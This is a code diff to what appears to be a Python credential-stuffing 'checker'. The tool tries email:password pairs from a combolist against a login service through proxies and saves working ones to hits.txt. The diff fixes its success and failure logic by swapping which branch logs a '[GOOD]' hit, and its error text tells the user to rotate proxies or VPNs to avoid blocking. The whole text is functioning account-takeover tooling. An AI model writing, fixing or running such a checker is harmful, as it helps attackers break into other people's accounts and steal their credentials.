@@ -122,16 +122,15 @@ def check_account(email,password):
     
         if 'Incorrect password' in request.text:
             lock.acquire()
-            print(Fore.GREEN+'[GOOD] '+email+':'+password+Fore.RESET)
-            valid+=1
-            file = open("hits.txt","a").write(email+":"+password+"\n")   
-            lock.release()
-        else:
-            lock.acquire()
             print(Fore.RED+'[BAD] '+email+':'+password+Fore.RESET)
             invalid+=1
             lock.release()
-
+        else:
+            lock.acquire()
+            print(Fore.GREEN+'[GOOD] '+email+':'+password+Fore.RESET)
+            valid+=1
+            file = open("hits.txt","a").write(email+":"+password+"\n")   
+            lock.release()           
     except:
         print(Fore.RED+'[ERROR] Proxy timeout. Change your proxies or use a different VPN'+Fore.RESET)
    
@@ -148,7 +147,6 @@ if __name__ =='__main__':
     except FileNotFoundError:
         print(Fore.RED+'[ERROR] Failed to open combolist'+Fore.RESET)
         quit()
-
     except ValueError:
         print(Fore.RED+'[ERROR] Value must be an integer'+Fore.RESET)
         quit() 
